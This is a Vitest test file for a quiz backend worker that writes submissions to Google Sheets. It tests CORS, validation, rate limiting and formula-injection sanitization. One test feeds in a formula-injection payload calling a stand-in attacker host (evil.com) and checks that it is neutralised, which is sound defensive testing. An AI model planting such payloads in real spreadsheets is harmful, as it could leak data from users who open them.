import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import worker, { Env } from '../src/index';

// Mock jose to prevent needing real valid RSA keys for testing
vi.mock('jose', () => ({
	importPKCS8: vi.fn().mockResolvedValue('mocked-key'),
	SignJWT: vi.fn().mockImplementation(() => ({
		setProtectedHeader: vi.fn().mockReturnThis(),
		sign: vi.fn().mockResolvedValue('mocked-jwt'),
	})),
}));

describe('Quiz Backend Worker', () => {
	const env: Env = {
		GOOGLE_CLIENT_EMAIL: 'test@example.com',
		GOOGLE_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----\nMOCK\n-----END PRIVATE KEY-----',
		GOOGLE_SHEET_ID: 'mock-sheet-id',
		ALLOWED_ORIGIN: 'https://myquiz.com',
	};

	let fetchMock: any;

	beforeEach(() => {
		// Mock the global fetch function
		fetchMock = vi.fn().mockImplementation(async (url: string, init?: RequestInit) => {
			if (url === 'https://oauth2.googleapis.com/token') {
				return new Response(JSON.stringify({ access_token: 'mock-access-token' }), { status: 200 });
			}
			if (url.startsWith(`https://sheets.googleapis.com/v4/spreadsheets/${env.GOOGLE_SHEET_ID}/`)) {
				return new Response(JSON.stringify({ updates: {} }), { status: 200 });
			}
			return new Response('Not Found', { status: 404 });
		});
		vi.stubGlobal('fetch', fetchMock);
	});

	afterEach(() => {
		vi.unstubAllGlobals();
		vi.clearAllMocks();
	});

	it('Test A: CORS Preflight - Should return 204 with allowed origin', async () => {
		const req = new Request('http://localhost/', { method: 'OPTIONS' });
		const res = await worker.fetch(req, env);

		expect(res.status).toBe(204);
		expect(res.headers.get('Access-Control-Allow-Origin')).toBe(env.ALLOWED_ORIGIN);
		expect(res.headers.get('Access-Control-Allow-Methods')).toBe('POST, OPTIONS');
	});

	it('Test B: Payload Validation Failure - Should return 400 for invalid payload', async () => {
		// Missing 'email', 'final_score', and 'answers'
		const req = new Request('http://localhost/', {
			method: 'POST',
			body: JSON.stringify({ name: 'John Doe', mobile: '1234567890' }),
			headers: { 'Content-Type': 'application/json', 'CF-Connecting-IP': '1.1.1.1' },
		});
		const res = await worker.fetch(req, env);

		expect(res.status).toBe(400);
		const data = (await res.json()) as { error: string };
		expect(data.error).toBe('Validation failed');
	});

	it('Test C: Successful Submission & Sanitization - Should sanitize formula injection', async () => {
		const payload = {
			name: "=IMPORTXML('http://evil.com')", // Formula injection attempt
			mobile: "+1234567890", // Leading '+' is a formula trigger in Sheets
			email: "test@example.com",
			final_score: 100,
			answers: ["@SUM(1,1)", "-500", "Normal Answer", 42], // '@' and '-' are formula triggers
		};

		const req = new Request('http://localhost/', {
			method: 'POST',
			body: JSON.stringify(payload),
			headers: { 'Content-Type': 'application/json', 'CF-Connecting-IP': '2.2.2.2' },
		});

		const res = await worker.fetch(req, env);
		expect(res.status).toBe(200);
		const responseData = (await res.json()) as { status: string };
		expect(responseData.status).toBe('success');

		// Extract the fetch call made to Google Sheets
		const sheetsCall = fetchMock.mock.calls.find((call: any[]) =>
			call[0].startsWith('https://sheets.googleapis.com')
		);
		expect(sheetsCall).toBeDefined();

		const requestBody = JSON.parse(sheetsCall[1].body);
		const submittedRow = requestBody.values[0];

		// submittedRow[0] is Timestamp
		expect(submittedRow[1]).toBe("'=IMPORTXML('http://evil.com')"); // Name sanitized
		expect(submittedRow[2]).toBe("'+1234567890"); // Mobile sanitized
		expect(submittedRow[3]).toBe("test@example.com"); // Email unaffected
		expect(submittedRow[4]).toBe(100); // Score unaffected
		expect(submittedRow[5]).toBe("'@SUM(1,1)"); // Answer 1 sanitized
		expect(submittedRow[6]).toBe("'-500"); // Answer 2 sanitized
		expect(submittedRow[7]).toBe("Normal Answer"); // Answer 3 unaffected
		expect(submittedRow[8]).toBe(42); // Answer 4 unaffected
	});

	it('Test D: Rate Limiting Enforcement - Should return 429 after 5 requests', async () => {
		const payload = {
			name: 'Rate Limit Test',
			mobile: '1234567890',
			email: 'rate@example.com',
			final_score: 50,
			answers: ['A', 'B'],
		};

		const makeRequest = () =>
			new Request('http://localhost/', {
				method: 'POST',
				body: JSON.stringify(payload),
				headers: { 'Content-Type': 'application/json', 'CF-Connecting-IP': '3.3.3.3' },
			});

		// Make 5 successful requests
		for (let i = 0; i < 5; i++) {
			const res = await worker.fetch(makeRequest(), env);
			expect(res.status).toBe(200);
		}

		// The 6th request should be blocked
		const blockedRes = await worker.fetch(makeRequest(), env);
		expect(blockedRes.status).toBe(429);
		const data = (await blockedRes.json()) as { error: string };
		expect(data.error).toBe('Too Many Requests');
	});
});